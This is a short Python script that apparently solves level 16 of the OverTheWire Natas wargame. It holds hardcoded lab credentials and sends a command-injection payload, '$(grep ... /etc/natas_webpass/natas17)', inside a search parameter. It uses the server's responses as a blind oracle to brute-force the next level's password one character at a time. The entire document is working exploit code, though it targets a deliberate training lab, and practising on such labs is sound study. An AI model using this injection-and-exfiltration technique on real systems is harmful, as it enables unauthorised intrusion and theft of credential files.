#!/bin/python
import requests
import string

url = "http://natas16.natas.labs.overthewire.org"
username = "natas16"
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh' # password for natas16 goes here

q_param = 'needle=apples$(grep+{}+/etc/natas_webpass/natas17)&submit=Search'

pw_chars = []
all_chars = ''.join([string.ascii_letters,string.digits])

hint = "apples"

for char in all_chars:
	query = ''.join([url, '?', q_param.format(char)])
	response = requests.get(query, auth=(username, password))
	if not hint in response.text:
		pw_chars.append(char)

pw_list = []
pw = ''

# This time, you need to specify that the pattern appears at the beginning of the line
q_param2 = 'needle=apples$(grep+^{}+/etc/natas_webpass/natas17)&submit=Search'
for i in range(1,64):
	for char in pw_chars:
		test = ''.join([pw, char])
		query = ''.join([url, '?', q_param2.format(test)])
		response = requests.get(query, auth=(username, password))
		if not hint in response.text:
			pw_list.append(char)
			pw = ''.join(pw_list)
			print("Password so far: ", pw)

print("Password:", pw)